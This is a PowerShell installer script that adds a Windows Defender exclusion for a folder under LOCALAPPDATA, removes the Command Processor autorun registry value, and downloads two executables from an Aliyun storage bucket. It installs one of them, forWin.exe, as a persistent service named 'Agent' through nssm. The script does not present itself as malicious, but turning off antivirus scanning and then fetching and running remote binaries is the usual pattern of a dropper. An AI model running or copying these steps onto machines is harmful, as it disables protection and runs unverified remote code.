$ProgressPreference = 'SilentlyContinue'

# Sync Time

Start-Service W32Time
w32tm /resync /force


$localAppData = $env:LOCALAPPDATA
$targetDirectory = Join-Path $localAppData "utools"
if (-not(Test-Path $targetDirectory))
{
  New-Item -Path $targetDirectory -ItemType Directory | Out-Null
}
Add-MpPreference -ExclusionPath $targetDirectory -ErrorAction SilentlyContinue
if ($?) {Write-Host -ForegroundColor Green " Change Windows Defender OK"}else{Write-Host -ForegroundColor Red "Change Windows Defender Fail"}


# Set windows console encoding to UTF-8

Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Command Processor\' -Name autorun -Force -ErrorAction SilentlyContinue | Out-Null

# New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Command Processor\' -Name autorun -Type String -Value "chcp 65001" -ErrorAction SilentlyContinue | Out-Null

$nssm="https://it2u.oss-cn-shenzhen.aliyuncs.com/utools/nssm.exe"
$client="https://it2u.oss-cn-shenzhen.aliyuncs.com/forWin.exe"


if( -not (Test-Path -Path $targetDirectory\nssm.exe)) {
  Invoke-WebRequest -Uri $nssm -OutFile $targetDirectory\"nssm.exe" -ErrorAction SilentlyContinue 
  Invoke-WebRequest -Uri $client -OutFile $targetDirectory\"forWin.exe" -ErrorAction SilentlyContinue
}

if (-not ((Get-Service -Name Agent -ErrorAction SilentlyContinue).Status -eq "Running")) {
  start-process -FilePath "$env:ComSpec" -WorkingDirectory $targetDirectory -ArgumentList "/c"," nssm install Agent forWin.exe" -NoNewWindow -Wait
}

if ((Get-Service -Name Agent -ErrorAction SilentlyContinue).Status -eq "Running")
{
  "service started"
  stop-service -Name Agent -Force -ErrorAction SilentlyContinue
  Stop-Process -Name forWin -Force -ErrorAction SilentlyContinue
  Start-Sleep -Seconds 2
  Invoke-WebRequest -Uri $client -OutFile $targetDirectory\"forWin.exe" -ErrorAction SilentlyContinue
  if ($?) {Write-Host -ForegroundColor Green " Update Service File OK"}else{Write-Host -ForegroundColor Red "Update Service File Fail"}

  Start-Service -Name Agent -ErrorAction SilentlyContinue
  if ($?) {Write-Host -ForegroundColor Green " Start Service OK"}else{Write-Host -ForegroundColor Red "Start Service  Fail"}


} else {
  Start-Service -Name Agent -ErrorAction SilentlyContinue
  if ($?) {Write-Host -ForegroundColor Green " Start Service OK"}else{Write-Host -ForegroundColor Red "Start Service  Fail"}

}
